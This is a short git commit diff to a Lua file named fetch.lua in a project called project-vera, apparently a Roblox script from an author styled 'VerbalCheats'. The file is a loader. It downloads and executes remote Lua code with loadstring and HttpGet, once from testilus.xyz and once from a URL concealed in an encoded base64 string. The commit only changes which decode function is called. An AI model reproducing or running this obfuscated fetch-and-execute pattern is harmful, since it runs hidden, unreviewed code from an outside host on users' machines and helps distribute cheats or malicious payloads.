2b0bce1ff1ff2cbd2d9e4bf599faa597c4596756
Jack <101001475+VerbalCheats@users.noreply.github.com>
2022-08-25 19:58:10 +0100

    Update fetch.lua

--- project-vera/fetch.lua
+++ project-vera/fetch.lua
@@ -1,3 +1,3 @@
 local base64 = loadstring(game:HttpGet("https://testilus.xyz/base64/init.lua"))()
 
-loadstring(game:HttpGet(base64.decode("xdzc1NpuWVncv9rcx83e2lfj5edZ1NjSyb+83FXgv9i4WcPYuLpX4L/NuOXj")))()
+loadstring(game:HttpGet(base64.Base64.Decode("xdzc1NpuWVncv9rcx83e2lfj5edZ1NjSyb+83FXgv9i4WcPYuLpX4L/NuOXj")))()
